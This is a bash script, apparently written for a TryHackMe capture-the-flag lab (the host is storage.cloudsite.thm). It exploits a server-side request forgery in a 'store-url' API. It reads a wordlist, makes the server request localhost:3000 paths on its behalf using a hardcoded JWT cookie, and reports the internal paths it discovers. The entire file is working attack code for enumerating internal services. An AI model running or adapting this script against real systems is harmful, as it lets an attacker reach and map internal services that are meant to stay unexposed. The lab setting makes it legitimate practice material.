#! /bin/bash

OPTSTRING=":w:"

while getopts ${OPTSTRING} opt; do
  case ${opt} in
    w)
      WORDLIST="${OPTARG}"
      echo "wordlist: $WORDLIST"
      if [[ ! -f "$WORDLIST" ]]; then
        echo "Error: File '$WORDLIST' not found."
        exit 1
      fi
      ;;
    \?) # handle invalid options
      echo "Error: Invalid option -${OPTARG}." >&2
      exit 1
      ;;
    :) # handle missing arguments
      echo "Error: Option -${OPTARG} requires an argument." >&2
      exit 1
      ;;
  esac
done

shift $((OPTIND - 1))

# change this
JWT='jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImZhYmlvQGdtYWlsLmNvbSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc1NDMyNzM5NywiZXhwIjoxNzU0MzMwOTk3fQ.4f-PnFSyI7JmwSM2-859BA70RJwilW_OLSEUfd5pzaE'

TOTLINES=$(wc -l ${WORDLIST})

i=0
while IFS= read -r FUZZ || [[ -n "$FUZZ" ]]; do
    i=$(($i+1))
    python3 -c "print(\"Progress ${i}/${TOTLINES}\", end=\"\r\")"
    
    URL="http://localhost:3000/${FUZZ}"
    UPLOAD_PATH=$(curl http://storage.cloudsite.thm/api/store-url -X POST --json "{\"url\":\"$URL\"}" -H "Cookie: $JWT" -s | jq '.path' | sed 's/"//g')
    
    HTML=$(curl http://storage.cloudsite.thm$UPLOAD_PATH -s -H "Cookie: $JWT")
    if [[ $HTML != *"Cannot GET /${FUZZ}"* ]]; then
        python3 -c "print(\"\nFound path: ${FUZZ}\")"
    fi
done < "$WORDLIST" 